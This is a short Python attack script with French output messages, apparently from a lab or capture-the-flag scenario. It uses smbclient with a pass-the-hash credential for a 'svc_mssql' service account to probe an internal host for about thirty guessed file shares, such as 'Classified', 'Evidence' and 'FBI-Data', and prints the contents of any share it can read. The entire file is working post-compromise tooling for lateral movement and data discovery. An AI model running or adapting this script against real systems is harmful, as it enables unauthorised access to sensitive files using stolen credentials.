#!/usr/bin/env python3
import subprocess

HOST = "172.28.5.5"
AUTH = "VALDORIA/svc_mssql%HEX_EXPURGE"

SHARES = [
    "FileVault", "File-Vault", "File_Vault",
    "Vault", "Vault$", "Files", "Files$",
    "Operations", "Operations$", "Ops",
    "Ops-Data", "Operational-Data",
    "Documents", "Documents$",
    "Evidence", "Evidence$",
    "Classified", "Classified$",
    "Secure", "Secure$",
    "Case-Files", "CaseFiles",
    "FBI-Data", "FBI-Files",
    "Backup", "Backup$",
    "Data", "Data$",
]

for index, share in enumerate(SHARES, 1):
    print(f"[{index}/{len(SHARES)}] {share}", flush=True)

    cmd = [
        "smbclient",
        f"//{HOST}/{share}",
        "-U", AUTH,
        "--pw-nt-hash",
        "-t", "4",
        "-c", "ls"
    ]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=7
        )

        output = result.stdout + result.stderr

        if "NT_STATUS_BAD_NETWORK_NAME" in output:
            continue

        if "NT_STATUS_ACCESS_DENIED" in output:
            print(f"  [!] Accès refusé : {share}")
        elif "NT_STATUS_LOGON_FAILURE" in output:
            print(f"  [-] Authentification refusée : {share}")
        elif result.returncode == 0:
            print(f"\n[+] PARTAGE ACCESSIBLE : {share}")
            print(output[:2000])
        else:
            print(f"  [?] Résultat inhabituel : {share}")
            print(output[-400:])

    except subprocess.TimeoutExpired:
        print(f"  [!] TIMEOUT : {share} (résultat indéterminé)")
        continue

    except Exception as exc:
        print(f"  [-] ERREUR : {exc}")
        continue

print("\n[*] Recherche terminée.")
